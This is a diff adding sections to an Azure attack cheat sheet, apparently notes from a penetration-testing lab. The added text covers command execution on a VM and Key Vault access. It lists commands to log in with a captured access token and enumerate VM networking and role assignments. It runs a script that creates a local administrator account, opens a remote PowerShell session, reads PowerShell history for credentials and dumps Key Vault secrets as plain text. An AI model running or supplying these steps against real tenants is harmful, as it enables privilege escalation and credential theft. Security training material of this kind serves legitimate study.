@@ -1291,49 +1291,85 @@ Publish-AzAutomationRunbook -RunbookName student38 -AutomationAccountName Hybrid
 Start-AzAutomationRunbook -RunbookName student38 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
 ```
 
-####
+## Command execution on a VM
+- Vm access can be found after getting a new user or tokens and seeing that it has access to a vm
+
+#### Connect with Az Powershell
+```
+$accesstoken = ''
+Connect-AzAccount -AccessToken $accesstoken -AccountId <CLIENT ID OR EMAIL>
 ```
 
+#### Get more information about the VM (networkprofile)
+```
+Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile
 ```
 
-####
+#### Get the network interface
+```
+Get-AzNetworkInterface -Name bkpadconnect368
 ```
 
+#### Query ID of public ip adress to get the public ip
+```
+Get-AzPublicIpAddress -Name bkpadconnectIP
 ```
 
-####
+#### Check role assignments on the VM
+```
+Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
 ```
 
+#### Check the allowed actions of the role definition
+```
+Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
 ```
 
-####
+#### Run a command on the VM
+```
+Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
 ```
 
+#### Contents of adduser.ps1
+```
+$passwd = ConvertTo-SecureString "Stud38Password@123" -AsPlainText -Force
+New-LocalUser -Name student38 -Password $passwd
+Add-LocalGroupMember -Group Administrators -Member student38
 ```
 
-####
+#### Access the VM
+```
+$password = ConvertTo-SecureString 'Stud38Password@123' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('student38', $Password)
+$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+Enter-PSSession $sess
 ```
 
+#### Check for credentials in powershell history (Try other ways to tho!)
+```
+cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+cat C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-####
+## Keyvault
+#### List all keyvaults
+```
+Get-AzKeyVault
 ```
 
+#### Get info about a specific keyvault
+```
+Get-AzKeyVault -VaultName ResearchKeyVault
 ```
 
-####
+#### List the saved creds from keyvault
+```
+Get-AzKeyVaultSecret -VaultName ResearchKeyVault -AsPlainText
 ```
 
+#### Read creds from a keyvault
 ```
-
-####
-```
-
-```
-
-####
-```
-
+Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
 ```
 
 ####
